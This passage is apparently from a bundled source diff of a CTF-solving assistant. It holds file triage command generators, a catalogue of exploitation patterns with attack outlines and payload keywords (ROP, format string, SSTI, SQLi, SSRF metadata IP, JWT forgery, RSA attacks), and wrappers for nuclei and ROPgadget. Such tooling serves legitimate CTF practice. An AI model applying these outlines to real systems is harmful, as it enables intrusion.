+    pattern: /\b(zip archive|tar archive|gzip compressed|bzip2 compressed|xz compressed|7-zip|rar archive)\b/i,
+    detectedType: "archive"
+  },
+  {
+    pattern: /\b(png image|jpeg image|gif image|bitmap|tiff image|webp image|svg image)\b/i,
+    detectedType: "image"
+  },
+  { pattern: /\b(pcap|capture file)\b/i, detectedType: "pcap" },
+  { pattern: /\bpdf document\b/i, detectedType: "pdf" },
+  {
+    pattern: /\b(shell script|python script|perl script|ruby script|php script|javascript source|typescript source)\b/i,
+    detectedType: "script"
+  },
+  { pattern: /\b(html document|json data|xml document)\b/i, detectedType: "web" }
+];
+function shellQuote(value) {
+  return `'${value.replace(/'/g, `'"'"'`)}'`;
+}
+function normalizedExtension(filePath) {
+  const lower = filePath.trim().toLowerCase();
+  if (lower.endsWith(".tar.gz") || lower.endsWith(".tgz")) {
+    return ".tgz";
+  }
+  const dot = lower.lastIndexOf(".");
+  return dot >= 0 ? lower.slice(dot) : "";
+}
+function detectFileType(filePath, fileOutput) {
+  const output = fileOutput ?? "";
+  for (const hint of FILE_OUTPUT_HINTS) {
+    if (hint.pattern.test(output)) {
+      return hint.detectedType;
+    }
+  }
+  const ext = normalizedExtension(filePath);
+  for (const hint of EXTENSION_HINTS) {
+    if (hint.extensions.includes(ext)) {
+      return hint.detectedType;
+    }
+  }
+  if (/^https?:\/\//i.test(filePath.trim())) {
+    return "web";
+  }
+  return "unknown";
+}
+function suggestTarget(detectedType) {
+  switch (detectedType) {
+    case "elf":
+      return "PWN";
+    case "web":
+      return "WEB_API";
+    case "archive":
+    case "image":
+    case "pcap":
+    case "pdf":
+      return "FORENSICS";
+    case "script":
+      return "MISC";
+    default:
+      return "UNKNOWN";
+  }
+}
+function generateTriageCommands(filePath, detectedType) {
+  const quoted = shellQuote(filePath);
+  const ext = normalizedExtension(filePath);
+  if (detectedType === "elf") {
+    return [
+      { tool: "file", command: `file ${quoted}`, purpose: "Confirm binary format", phase: 1 },
+      {
+        tool: "checksec",
+        command: `checksec --file=${quoted}`,
+        purpose: "Inspect binary mitigations",
+        phase: 1
+      },
+      { tool: "readelf", command: `readelf -h ${quoted}`, purpose: "Inspect ELF headers", phase: 1 },
+      {
+        tool: "strings",
+        command: `strings ${quoted} | grep -iE "flag|CTF" | head -20`,
+        purpose: "Find CTF indicators quickly",
+        phase: 1
+      },
+      { tool: "ldd", command: `ldd ${quoted}`, purpose: "Inspect linked libraries", phase: 2 }
+    ];
+  }
+  if (detectedType === "archive") {
+    const commands = [
+      { tool: "file", command: `file ${quoted}`, purpose: "Confirm archive container", phase: 1 },
+      { tool: "binwalk", command: `binwalk ${quoted}`, purpose: "Detect embedded content", phase: 1 },
+      { tool: "7z", command: `7z l ${quoted}`, purpose: "List archive entries", phase: 1 }
+    ];
+    if (ext === ".zip") {
+      commands.push({ tool: "unzip", command: `unzip -l ${quoted}`, purpose: "List ZIP members", phase: 1 });
+    } else {
+      commands.push({ tool: "tar", command: `tar -tf ${quoted}`, purpose: "List TAR-like members", phase: 1 });
+    }
+    return commands;
+  }
+  if (detectedType === "image") {
+    const commands = [
+      { tool: "file", command: `file ${quoted}`, purpose: "Confirm image encoding", phase: 1 },
+      { tool: "exiftool", command: `exiftool ${quoted}`, purpose: "Extract metadata", phase: 1 },
+      { tool: "binwalk", command: `binwalk ${quoted}`, purpose: "Scan for embedded files", phase: 1 },
+      { tool: "strings", command: `strings ${quoted} | head -20`, purpose: "Preview readable strings", phase: 1 }
+    ];
+    if (ext === ".png") {
+      commands.push({ tool: "zsteg", command: `zsteg ${quoted}`, purpose: "Probe PNG steganography", phase: 2 });
+    }
+    return commands;
+  }
+  if (detectedType === "pcap") {
+    return [
+      { tool: "file", command: `file ${quoted}`, purpose: "Confirm capture file format", phase: 1 },
+      {
+        tool: "tshark",
+        command: `tshark -r ${quoted} -q -z io,phs`,
+        purpose: "Protocol hierarchy summary",
+        phase: 1
+      },
+      {
+        tool: "tshark",
+        command: `tshark -r ${quoted} -T fields -e frame.protocols | sort -u`,
+        purpose: "List unique protocol stacks",
+        phase: 1
+      }
+    ];
+  }
+  if (detectedType === "pdf") {
+    return [
+      { tool: "file", command: `file ${quoted}`, purpose: "Confirm PDF document", phase: 1 },
+      { tool: "exiftool", command: `exiftool ${quoted}`, purpose: "Extract metadata", phase: 1 },
+      {
+        tool: "strings",
+        command: `strings ${quoted} | grep -i flag | head -10`,
+        purpose: "Find likely flag strings",
+        phase: 1
+      }
+    ];
+  }
+  if (detectedType === "script" || detectedType === "web") {
+    return [
+      { tool: "file", command: `file ${quoted}`, purpose: "Confirm text/script type", phase: 1 },
+      { tool: "head", command: `head -50 ${quoted}`, purpose: "Inspect top-of-file logic", phase: 1 },
+      { tool: "wc", command: `wc -l ${quoted}`, purpose: "Estimate content size", phase: 1 }
+    ];
+  }
+  return [
+    { tool: "file", command: `file ${quoted}`, purpose: "Baseline type identification", phase: 1 },
+    { tool: "xxd", command: `xxd ${quoted} | head -5`, purpose: "Inspect leading bytes", phase: 1 },
+    { tool: "strings", command: `strings ${quoted} | head -20`, purpose: "Preview readable strings", phase: 1 }
+  ];
+}
+function triageFile(filePath, fileOutput) {
+  const detectedType = detectFileType(filePath, fileOutput);
+  const suggestedTarget = suggestTarget(detectedType);
+  const commands = generateTriageCommands(filePath, detectedType);
+  const immediateCount = commands.filter((command) => command.phase === 1).length;
+  const conditionalCount = commands.length - immediateCount;
+  const summary = [
+    `File: ${filePath}`,
+    `Detected type: ${detectedType}`,
+    `Suggested target: ${suggestedTarget}`,
+    `Commands: ${immediateCount} immediate${conditionalCount > 0 ? `, ${conditionalCount} conditional` : ""}`
+  ].join(`
+`);
+  return {
+    filePath,
+    detectedType,
+    suggestedTarget,
+    commands,
+    summary
+  };
+}
+
+// src/orchestration/pattern-matcher.ts
+var KNOWN_PATTERNS = [
+  {
+    patternId: "buffer-overflow-basic",
+    patternName: "Basic Stack Buffer Overflow",
+    confidence: "high",
+    targetType: "PWN",
+    description: "Fixed-size stack buffer with controllable overwrite and likely RIP/EIP control.",
+    suggestedApproach: "Find exact offset with cyclic pattern, check mitigations (NX/PIE/canary), then pivot to ret2win/ret2libc/ROP based on protections.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["buffer overflow", "gets", "strcpy", "stack smash", "rip control", "eip", "overflow"]
+  },
+  {
+    patternId: "format-string-leak",
+    patternName: "Format String Leak/Write",
+    confidence: "high",
+    targetType: "PWN",
+    description: "User input reaches printf-like sink without format control sanitization.",
+    suggestedApproach: "Probe with %p/%x to leak stack/libc, determine argument index, then use %n for targeted writes if needed.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["format string", "printf", "%p", "%n", "%x", "vfprintf", "user controlled format"]
+  },
+  {
+    patternId: "heap-tcache-poison",
+    patternName: "Heap Tcache Poisoning",
+    confidence: "high",
+    targetType: "PWN",
+    description: "Tcache freelist manipulation enables arbitrary chunk return.",
+    suggestedApproach: "Check glibc version, leak heap/libc pointers, poison tcache next pointer, then allocate to overwrite hook/vtable target.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["tcache", "double free", "free list", "heap chunk", "glibc 2.27", "poison", "malloc"]
+  },
+  {
+    patternId: "heap-uaf",
+    patternName: "Heap Use-After-Free",
+    confidence: "high",
+    targetType: "PWN",
+    description: "Freed chunk remains reachable through stale pointer path.",
+    suggestedApproach: "Map object lifecycle, reclaim freed chunk with controlled data, then hijack function pointer/vtable or metadata for code execution.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["use after free", "uaf", "dangling pointer", "free then use", "heap object", "stale reference"]
+  },
+  {
+    patternId: "ret2libc",
+    patternName: "ret2libc",
+    confidence: "high",
+    targetType: "PWN",
+    description: "Control flow hijack with NX enabled and libc symbols available via leak.",
+    suggestedApproach: "Leak libc function address, compute libc base, resolve system and /bin/sh, then craft aligned ROP call chain.",
+    suggestedTemplate: "ret2libc-outline",
+    keywords: ["ret2libc", "libc leak", "got leak", "plt", "system", "/bin/sh", "nx enabled"]
+  },
+  {
+    patternId: "rop-chain",
+    patternName: "ROP Chain Construction",
+    confidence: "high",
+    targetType: "PWN",
+    description: "No direct shellcode execution; chain gadgets to call useful functions/syscalls.",
+    suggestedApproach: "Collect gadgets for argument registers and stack alignment, then chain leak stage and execution stage with deterministic constraints.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["rop", "gadget", "pop rdi", "ret gadget", "chain", "nx", "return oriented"]
+  },
+  {
+    patternId: "srop",
+    patternName: "Sigreturn-Oriented Programming",
+    confidence: "medium",
+    targetType: "PWN",
+    description: "Signal frame forgery to control syscall context in limited gadget scenarios.",
+    suggestedApproach: "Find syscall and sigreturn trigger, forge rt_sigreturn frame on stack, then set registers for execve/mprotect flow.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["srop", "sigreturn", "rt_sigreturn", "syscall; ret", "ucontext", "frame forgery"]
+  },
+  {
+    patternId: "ret2dlresolve",
+    patternName: "ret2dlresolve",
+    confidence: "medium",
+    targetType: "PWN",
+    description: "Dynamic linker abuse to resolve symbols at runtime without direct libc leak.",
+    suggestedApproach: "Craft fake relocation/symbol structures on writable memory, invoke plt resolver entry, resolve system and execute payload.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["ret2dlresolve", "dl-resolve", "linker", "plt0", "reloc", "dynsym", "dynstr"]
+  },
+  {
+    patternId: "seccomp-bypass",
+    patternName: "Seccomp Filter Bypass",
+    confidence: "medium",
+    targetType: "PWN",
+    description: "Restricted syscalls require alternative primitives to get execution impact.",
+    suggestedApproach: "Recover seccomp policy, choose allowed syscalls, then pivot to open/read/write or ORW-style chain instead of blocked execve.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["seccomp", "prctl", "sandbox", "syscall filter", "orw", "bpf"]
+  },
+  {
+    patternId: "stack-pivot",
+    patternName: "Stack Pivot",
+    confidence: "medium",
+    targetType: "PWN",
+    description: "Limited overflow but controllable pointer allows moving stack to larger controlled region.",
+    suggestedApproach: "Locate pivot gadget (leave; ret/xchg rsp), stage second ROP chain in writable buffer, then pivot and execute full chain.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["stack pivot", "leave; ret", "xchg rsp", "fake stack", "pivot", "bss chain"]
+  },
+  {
+    patternId: "off-by-one",
+    patternName: "Off-by-One Overflow",
+    confidence: "medium",
+    targetType: "PWN",
+    description: "Single-byte overwrite corrupts metadata/size or saved frame state.",
+    suggestedApproach: "Model exact boundary condition, target size byte/prev_inuse/canary LSB, and chain into controlled allocation or return path.",
+    suggestedTemplate: "pwntools-skeleton",
+    keywords: ["off by one", "null byte overflow", "size byte", "prev_inuse", "one byte overwrite", "boundary"]
+  },
+  {
+    patternId: "ssti-jinja2",
+    patternName: "SSTI in Jinja2",
+    confidence: "high",
+    targetType: "WEB_API",
+    description: "Template expression input is rendered directly by Jinja2/Flask.",
+    suggestedApproach: "Confirm expression evaluation with arithmetic payload, enumerate object graph safely, then escalate to file read/command execution proof.",
+    keywords: ["ssti", "jinja2", "{{7*7}}", "render_template_string", "template injection", "flask"]
+  },
+  {
+    patternId: "sqli-union",
+    patternName: "Union-Based SQLi",
+    confidence: "high",
+    targetType: "WEB_API",
+    description: "Query composition allows UNION SELECT data extraction.",
+    suggestedApproach: "Identify injectable parameter, align column count/types, then extract schema and sensitive fields with minimal-impact payloads.",
+    keywords: ["union select", "sql injection", "order by", "database error", "mysql", "postgres", "sqlite"]
+  },
+  {
+    patternId: "sqli-blind",
+    patternName: "Blind SQLi",
+    confidence: "high",
+    targetType: "WEB_API",
+    description: "No direct SQL output but boolean/time side-channel present.",
+    suggestedApproach: "Build deterministic boolean or time-based probes, then extract target data bitwise/charwise with retry and jitter control.",
+    keywords: ["blind sqli", "time based", "sleep(", "boolean based", "if(", "pg_sleep", "benchmark("]
+  },
+  {
+    patternId: "ssrf-basic",
+    patternName: "SSRF",
+    confidence: "high",
+    targetType: "WEB_API",
+    description: "Server fetches attacker-controlled URL and can reach internal resources.",
+    suggestedApproach: "Validate outbound fetch, test localhost/metadata/internal hosts with safe probes, then demonstrate controlled internal access impact.",
+    keywords: ["ssrf", "url fetch", "metadata", "169.254.169.254", "internal host", "webhook", "proxy"]
+  },
+  {
+    patternId: "jwt-forgery",
+    patternName: "JWT Forgery/Confusion",
+    confidence: "high",
+    targetType: "WEB_API",
+    description: "JWT verification weakness (alg confusion/weak secret/kid abuse).",
+    suggestedApproach: "Inspect token header/alg behavior, test none/HS-RS confusion where applicable, then prove privilege change with signed forgery.",
+    keywords: ["jwt", "alg none", "hs256", "rs256", "kid", "jwk", "token forgery"]
+  },
+  {
+    patternId: "deserialization",
+    patternName: "Unsafe Deserialization",
+    confidence: "medium",
+    targetType: "WEB_API",
+    description: "Untrusted serialized input reaches dangerous object constructors/gadgets.",
+    suggestedApproach: "Identify serialization format and sink, craft minimal gadget payload for controlled side effect, then escalate impact carefully.",
+    keywords: ["deserialization", "pickle", "java serialization", "ysoserial", "objectinputstream", "gadget chain"]
+  },
+  {
+    patternId: "lfi-rfi",
+    patternName: "LFI/RFI",
+    confidence: "high",
+    targetType: "WEB_API",
+    description: "File include/read path is controllable and escapes intended directory.",
+    suggestedApproach: "Probe traversal normalization, read benign target first, then prove sensitive file exposure or inclusion impact.",
+    keywords: ["lfi", "rfi", "path traversal", "../", "php://filter", "include", "file read"]
+  },
+  {
+    patternId: "xxe-injection",
+    patternName: "XXE Injection",
+    confidence: "medium",
+    targetType: "WEB_API",
+    description: "XML parser allows external entity expansion.",
+    suggestedApproach: "Confirm external entity resolution with harmless entity, then demonstrate file read or SSRF through controlled DTD payload.",
+    keywords: ["xxe", "doctype", "xml parser", "external entity", "dtd", "sax", "dom4j"]
+  },
+  {
+    patternId: "race-condition",
+    patternName: "Race Condition",
+    confidence: "medium",
+    targetType: "WEB_API",
+    description: "Concurrent requests bypass state checks or consume shared resources unsafely.",
+    suggestedApproach: "Locate check/use boundary, send synchronized concurrent requests, and verify inconsistent final state as reproducible impact.",
+    keywords: ["race condition", "toctou", "concurrent request", "double spend", "parallel", "non-atomic"]
+  },
+  {
+    patternId: "prototype-pollution",
+    patternName: "Prototype Pollution",
+    confidence: "medium",
+    targetType: "WEB_API",
+    description: "JavaScript object merge/path-set lets attacker control prototype properties.",
+    suggestedApproach: "Test __proto__/constructor.prototype write paths, confirm polluted property propagation, then prove privilege/logic impact.",
+    keywords: ["prototype pollution", "__proto__", "constructor.prototype", "lodash merge", "node", "polluted"]
+  },
+  {
+    patternId: "rsa-small-e",
+    patternName: "RSA Small Exponent",
+    confidence: "high",
+    targetType: "CRYPTO",
+    description: "Low exponent with weak padding/no padding enables direct root or broadcast attacks.",
+    suggestedApproach: "Check padding mode and message bounds, then apply integer root or Hastad-style recovery with verifiable small test vectors.",
+    keywords: ["rsa", "small e", "e=3", "hastad", "no padding", "integer root", "broadcast"]
+  },
+  {
+    patternId: "rsa-common-modulus",
+    patternName: "RSA Common Modulus",
+    confidence: "high",
+    targetType: "CRYPTO",
+    description: "Same modulus reused with different coprime exponents.",
+    suggestedApproach: "Verify same N and gcd(e1,e2)=1, apply extended Euclid on exponents, combine ciphertext powers to recover plaintext.",
+    keywords: ["common modulus", "same n", "rsa", "extended euclid", "coprime exponents", "bezout"]
+  },
+  {
+    patternId: "rsa-wiener",
+    patternName: "RSA Wiener Attack",
+    confidence: "medium",
+    targetType: "CRYPTO",
+    description: "Private exponent d too small and recoverable via continued fractions.",
+    suggestedApproach: "Test Wiener conditions quickly, run continued fraction convergents, then verify recovered key by encryption/decryption round trip.",
+    keywords: ["wiener", "continued fraction", "small d", "rsa weak key", "convergent", "private exponent"]
+  },
+  {
+    patternId: "aes-ecb-oracle",
+    patternName: "AES ECB Oracle",
+    confidence: "high",
+    targetType: "CRYPTO",
+    description: "Deterministic ECB encryption oracle leaks plaintext structure/bytes.",
+    suggestedApproach: "Confirm ECB block repetition, derive block size, then perform byte-at-a-time dictionary attack with alignment control.",
+    suggestedTemplate: "ecb-byte-at-a-time",
+    keywords: ["aes ecb", "oracle", "byte at a time", "deterministic block", "repeated blocks", "chosen plaintext"]
+  },
+  {
+    patternId: "aes-cbc-bitflip",
+    patternName: "AES CBC Bit-Flipping",
+    confidence: "high",
+    targetType: "CRYPTO",
+    description: "CBC malleability permits controlled plaintext change without key knowledge.",
+    suggestedApproach: "Locate target plaintext block, compute xor delta against previous ciphertext block, then verify privilege field flip.",
+    keywords: ["cbc bitflip", "aes cbc", "malleability", "iv manipulation", "xor delta", "admin=true"]
+  },
+  {
+    patternId: "padding-oracle",
+    patternName: "CBC Padding Oracle",
+    confidence: "high",
+    targetType: "CRYPTO",
+    description: "Padding validity side-channel allows plaintext recovery/forgery.",
+    suggestedApproach: "Stabilize oracle signal, recover plaintext bytewise from tail, then optionally forge valid ciphertext for target message.",
+    suggestedTemplate: "padding-oracle-loop",
+    keywords: ["padding oracle", "pkcs7", "cbc", "invalid padding", "oracle", "bytewise decryption"]
+  },
+  {
+    patternId: "hash-length-extension",
+    patternName: "Hash Length Extension",
+    confidence: "medium",
+    targetType: "CRYPTO",
+    description: "MAC built as hash(secret || message) on Merkle-Damgard hash is forgeable.",
+    suggestedApproach: "Identify vulnerable construction and hash family, brute-force key length candidates, then append controlled suffix with valid MAC.",
+    keywords: ["length extension", "sha1", "md5", "secret prefix", "merkle damgard", "mac forgery"]
+  },
+  {
+    patternId: "discrete-log",
+    patternName: "Discrete Log Weak Parameters",
+    confidence: "medium",
+    targetType: "CRYPTO",
+    description: "Group parameters permit tractable DLP solution (small subgroup/smooth order).",
+    suggestedApproach: "Factor group order where possible, use baby-step giant-step or Pohlig-Hellman, then verify secret reconstruction.",
+    keywords: ["discrete log", "dh", "pohlig hellman", "baby-step giant-step", "smooth order", "small subgroup"]
+  },
+  {
+    patternId: "xor-known-plaintext",
+    patternName: "XOR Known-Plaintext",
+    confidence: "high",
+    targetType: "CRYPTO",
+    description: "XOR keystream reused or partially known allowing key recovery.",
+    suggestedApproach: "Use known plaintext crib to recover keystream segment, extend by consistency checks, and decrypt remaining ciphertext.",
+    keywords: ["xor", "known plaintext", "crib", "reused key", "one time pad reuse", "keystream"]
+  },
+  {
+    patternId: "mt19937-predict",
+    patternName: "MT19937 State Prediction",
+    confidence: "medium",
+    targetType: "CRYPTO",
+    description: "Enough PRNG outputs leak internal MT19937 state and future outputs.",
+    suggestedApproach: "Collect sufficient outputs, untemper to reconstruct state, then predict future values or recover seed path.",
+    keywords: ["mt19937", "mersenne twister", "untemper", "prng", "predict output", "seed recovery"]
+  },
+  {
+    patternId: "anti-debug",
+    patternName: "Anti-Debug Techniques",
+    confidence: "medium",
+    targetType: "REV",
+    description: "Binary actively detects debugger/instrumentation to alter control flow.",
+    suggestedApproach: "Identify anti-debug checks (ptrace/timing/self-check), patch or emulate bypass, then re-run with parity artifacts.",
+    keywords: ["anti debug", "ptrace", "isdebuggerpresent", "timing check", "debug detect", "self check"]
+  },
+  {
+    patternId: "vm-obfuscation",
+    patternName: "VM-Based Obfuscation",
+    confidence: "medium",
+    targetType: "REV",
+    description: "Custom bytecode VM hides core logic behind dispatcher and handlers.",
+    suggestedApproach: "Locate VM loop and handler table, lift bytecode semantics, then solve/check constraints from reconstructed VM instructions.",
+    keywords: ["vm", "bytecode", "dispatcher", "handler", "virtual machine", "obfuscation"]
+  },
+  {
+    patternId: "angr-solvable",
+    patternName: "Angr-Solvable Constraint Path",
+    confidence: "medium",
+    targetType: "REV",
+    description: "Program path conditions are suitable for symbolic execution.",
+    suggestedApproach: "Isolate win/lose addresses, model input bytes as symbolic vars, constrain bad paths away, and solve for accepted input.",
+    keywords: ["angr", "symbolic execution", "find avoid", "path constraints", "claripy", "solve input"]
+  },
+  {
+    patternId: "z3-constraints",
+    patternName: "Z3 Constraint Solving",
+    confidence: "high",
+    targetType: "REV",
+    description: "Validation logic is arithmetic/bitwise constraints directly translatable to SMT.",
+    suggestedApproach: "Extract exact constraints from decompilation, encode as bit-vectors in z3, solve, and validate candidate on original binary.",
+    keywords: ["z3", "constraints", "bit vector", "smt", "equation", "symbolic solver"]
+  },
+  {
+    patternId: "self-modifying-code",
+    patternName: "Self-Modifying Code",
+    confidence: "medium",
+    targetType: "REV",
+    description: "Runtime code/data mutation invalidates naive static analysis assumptions.",
+    suggestedApproach: "Trace runtime writes to executable/validation regions, dump post-decryption stages, and analyze stabilized code snapshot.",
+    keywords: ["self modifying", "runtime patch", "unpack", "decrypt code", "jit", "write xor execute"]
+  },
+  {
+    patternId: "steganography-lsb",
+    patternName: "Steganography LSB",
+    confidence: "high",
+    targetType: "FORENSICS",
+    description: "Payload hidden in image/audio least-significant bits or channel ordering.",
+    suggestedApproach: "Inspect metadata and channels, extract LSB planes with multiple bit orders, then validate decoded payload structure.",
+    keywords: ["steganography", "lsb", "steg", "png", "bitmap", "hidden message", "channels"]
+  },
+  {
+    patternId: "pcap-extraction",
+    patternName: "PCAP Stream Extraction",
+    confidence: "high",
+    targetType: "FORENSICS",
+    description: "Key evidence/flag resides in network capture streams or transferred files.",
+    suggestedApproach: "Identify suspicious protocols/hosts, reconstruct streams/files, then carve/decode transferred artifacts for final evidence.",
+    keywords: ["pcap", "wireshark", "tcp stream", "http objects", "dns exfil", "packet capture"]
+  },
+  {
+    patternId: "memory-dump",
+    patternName: "Memory Dump Analysis",
+    confidence: "medium",
+    targetType: "FORENSICS",
+    description: "Secrets/process traces recoverable from volatile memory snapshot.",
+    suggestedApproach: "Profile memory image, enumerate processes/connections, extract credentials/command history/artifacts, and cross-check timeline.",
+    keywords: ["memory dump", "volatility", "ram", "process list", "lsass", "mem image"]
+  },
+  {
+    patternId: "disk-image",
+    patternName: "Disk Image Timeline",
+    confidence: "medium",
+    targetType: "FORENSICS",
+    description: "Filesystem artifacts in raw disk image reveal deleted/hidden data.",
+    suggestedApproach: "Mount image read-only, inspect partitions/filesystems, recover deleted entries, and build timeline from metadata.",
+    keywords: ["disk image", "forensic image", "partition", "mft", "ext4", "deleted files", "timeline"]
+  },
+  {
+    patternId: "file-carving",
+    patternName: "File Carving",
+    confidence: "medium",
+    targetType: "FORENSICS",
+    description: "Embedded payload exists in unallocated/slack or concatenated binary blobs.",
+    suggestedApproach: "Locate magic bytes and boundaries, carve candidate files, then validate headers/checksums and recurse into nested containers.",
+    keywords: ["file carving", "magic bytes", "binwalk", "foremost", "slack space", "embedded file"]
+  }
+];
+var CONFIDENCE_RANK = {
+  low: 1,
+  medium: 2,
+  high: 3
+};
+function normalize(value) {
+  return value.trim().toLowerCase().replace(/\s+/g, " ");
+}
+function toTokenSet(text) {
+  const parts = text.split(/[^a-z0-9_+./%-]+/i).map((p) => p.trim().toLowerCase()).filter((p) => p.length > 0);
+  return new Set(parts);
+}
+function keywordMatched(normalizedText, tokens, keyword) {
+  const normalizedKeyword = normalize(keyword);
+  if (!normalizedKeyword) {
+    return false;
+  }
+  if (normalizedKeyword.length <= 3) {
+    return tokens.has(normalizedKeyword);
+  }
+  if (normalizedKeyword.includes(" ") || normalizedKeyword.includes("-") || normalizedKeyword.includes("/")) {
+    return normalizedText.includes(normalizedKeyword);
+  }
+  return tokens.has(normalizedKeyword) || normalizedText.includes(normalizedKeyword);
+}
+function mergeConfidence(baseline, hits, totalKeywords) {
+  if (totalKeywords <= 0) {
+    return baseline;
+  }
+  const ratio = hits / totalKeywords;
+  const derived = ratio >= 0.6 ? "high" : ratio >= 0.35 ? "medium" : "low";
+  return CONFIDENCE_RANK[derived] > CONFIDENCE_RANK[baseline] ? derived : baseline;
+}
+function matchPatterns(text, targetType) {
+  const normalizedText = normalize(text ?? "");
+  if (!normalizedText) {
+    return [];
+  }
+  const tokens = toTokenSet(normalizedText);
+  const scoredMatches = KNOWN_PATTERNS.filter((pattern) => targetType ? pattern.targetType === targetType : true).map((pattern) => {
+    const validKeywords = pattern.keywords.map(normalize).filter((keyword) => keyword.length > 0);
+    const hits = validKeywords.filter((keyword) => keywordMatched(normalizedText, tokens, keyword));
+    const phraseHit = hits.some((keyword) => keyword.includes(" ") || keyword.includes("-") || keyword.includes("/"));
+    const hitCount = hits.length;
+    const ratio = validKeywords.length > 0 ? hitCount / validKeywords.length : 0;
+    const shouldInclude = hitCount >= 2 || ratio >= 0.34 || phraseHit;
+    if (!shouldInclude) {
+      return null;
+    }
+    const score = hitCount * 10 + Math.round(ratio * 100);
+    return {
+      pattern: {
+        ...pattern,
+        confidence: mergeConfidence(pattern.confidence, hitCount, validKeywords.length)
+      },
+      score
+    };
+  }).filter((entry) => entry !== null);
+  return scoredMatches.sort((a, b) => {
+    const confDiff = CONFIDENCE_RANK[b.pattern.confidence] - CONFIDENCE_RANK[a.pattern.confidence];
+    if (confDiff !== 0) {
+      return confDiff;
+    }
+    if (b.score !== a.score) {
+      return b.score - a.score;
+    }
+    return a.pattern.patternId.localeCompare(b.pattern.patternId);
+  }).map((entry) => entry.pattern);
+}
+function buildPatternSummary(matches) {
+  if (!matches || matches.length === 0) {
+    return "No strong known CTF pattern matches found. Continue SCAN with 2-4 hypotheses and cheapest disconfirm tests.";
+  }
+  const lines = [
+    `Known pattern matches: ${matches.length}`,
+    "Use highest-confidence items first and run the cheapest disconfirm test before deep execution."
+  ];
+  for (const match of matches) {
+    const templatePart = match.suggestedTemplate ? ` | template=${match.suggestedTemplate}` : "";
+    lines.push(`- [${match.confidence}] ${match.patternName} (${match.patternId}, ${match.targetType})${templatePart}`, `  approach: ${match.suggestedApproach}`, `  keywords: ${match.keywords.join(", ")}`);
+  }
+  return lines.join(`
+`);
+}
+
+// src/orchestration/tool-integration.ts
+var DEFAULT_NUCLEI_RATE_LIMIT = 50;
+var MIN_NUCLEI_RATE_LIMIT = 1;
+var MAX_NUCLEI_RATE_LIMIT = 200;
+var MIN_ROP_DEPTH = 1;
+var MAX_ROP_DEPTH = 40;
+function shellQuote2(value) {
+  return `'${value.replace(/'/g, `'"'"'`)}'`;
+}
+function clamp(value, min, max) {
+  if (!Number.isFinite(value)) {
+    return min;
+  }
+  return Math.min(max, Math.max(min, Math.trunc(value)));
+}
+function uniqStrings(values) {
+  return Array.from(new Set(values));
+}
+function checksecCommand(binaryPath) {
+  return {
+    tool: "checksec",
+    command: `checksec --file=${shellQuote2(binaryPath)}`,
+    purpose: "Inspect binary hardening protections",
+    outputParser: "parseChecksecOutput"
+  };
+}
+function ropgadgetCommand(binaryPath, options) {
+  const parts = ["ROPgadget", `--binary ${shellQuote2(binaryPath)}`];
+  if (typeof options?.depth === "number") {
+    parts.push(`--depth ${clamp(options.depth, MIN_ROP_DEPTH, MAX_ROP_DEPTH)}`);
+  }
+  const filter = options?.filter?.trim();
+  if (filter) {
+    parts.push(`--only ${shellQuote2(filter)}`);
+  }
+  return {
+    tool: "ROPgadget",
+    command: parts.join(" "),
+    purpose: "Discover usable ROP gadgets",
+    outputParser: "ropgadget_summary_regex"
+  };
+}
+function oneGadgetCommand(libcPath) {
+  return {
+    tool: "one_gadget",
+    command: `one_gadget --raw ${shellQuote2(libcPath)}`,
+    purpose: "Enumerate one-shot libc gadget offsets",
+    outputParser: "one_gadget_offset_regex"
+  };
+}
+function binwalkCommand(filePath, extract = false) {
+  return {
+    tool: "binwalk",
+    command: `binwalk${extract ? " -e" : ""} ${shellQuote2(filePath)}`,
+    purpose: extract ? "Scan and extract embedded data" : "Scan for embedded file signatures",
+    outputParser: "binwalk_signature_regex"
+  };
+}
+function exiftoolCommand(filePath) {
+  return {
+    tool: "exiftool",
+    command: `exiftool ${shellQuote2(filePath)}`,
+    purpose: "Extract artifact metadata",
+    outputParser: "exif_key_value_regex"
+  };
+}
+function nucleiCommand(target, options) {
+  const rateLimit = clamp(options?.rateLimit ?? DEFAULT_NUCLEI_RATE_LIMIT, MIN_NUCLEI_RATE_LIMIT, MAX_NUCLEI_RATE_LIMIT);
+  const parts = [
+    "nuclei",
+    `-u ${shellQuote2(target)}`,
+    "-silent",
+    "-no-color",
+    `-rate-limit ${rateLimit}`
+  ];
+  const templates = options?.templates?.trim();
+  if (templates) {
+    parts.push(`-t ${shellQuote2(templates)}`);
+  }
+  const severity = uniqStrings((options?.severity ?? "").split(",").map((item) => item.trim().toLowerCase()).filter((item) => /^(info|low|medium|high|critical|unknown)$/.test(item))).join(",");
+  if (severity) {
+    parts.push(`-severity ${shellQuote2(severity)}`);
+  }
+  return {
+    tool: "nuclei",
+    command: parts.join(" "),
+    purpose: "Run template vulnerability checks with safety bounds",
+    outputParser: "nuclei_finding_regex"
+  };
+}
+function rsactftoolCommand(options) {
+  const parts = ["RsaCtfTool", "--private"];
+  const publicKey = options.publicKey?.trim();
+  if (publicKey) {
+    parts.push(`--publickey ${shellQuote2(publicKey)}`);
+  } else {
+    const n = options.n?.trim();
+    const e = options.e?.trim();
+    const c = options.c?.trim();
+    if (n) {
+      parts.push(`--n ${shellQuote2(n)}`);
+    }
+    if (e) {
+      parts.push(`--e ${shellQuote2(e)}`);
+    }
+    if (c) {
+      parts.push(`--uncipher ${shellQuote2(c)}`);
+    }
+  }
+  if (parts.length === 2) {
+    parts.push("--help");
+  }
+  return {
+    tool: "RsaCtfTool",
+    command: parts.join(" "),
+    purpose: "Attempt RSA key recovery/decryption",
+    outputParser: "rsactftool_key_material_regex"
+  };
+}
+function patchelfCommand(binaryPath, libcPath, ldPath) {
+  const steps = [];
+  const cleanLdPath = ldPath?.trim();
+  if (cleanLdPath) {
+    steps.push(`patchelf --set-interpreter ${shellQuote2(cleanLdPath)} ${shellQuote2(binaryPath)}`);
+  }
+  steps.push(`patchelf --replace-needed libc.so.6 ${shellQuote2(libcPath)} ${shellQuote2(binaryPath)}`);
+  return {
+    tool: "patchelf",
+    command: steps.join(" && "),
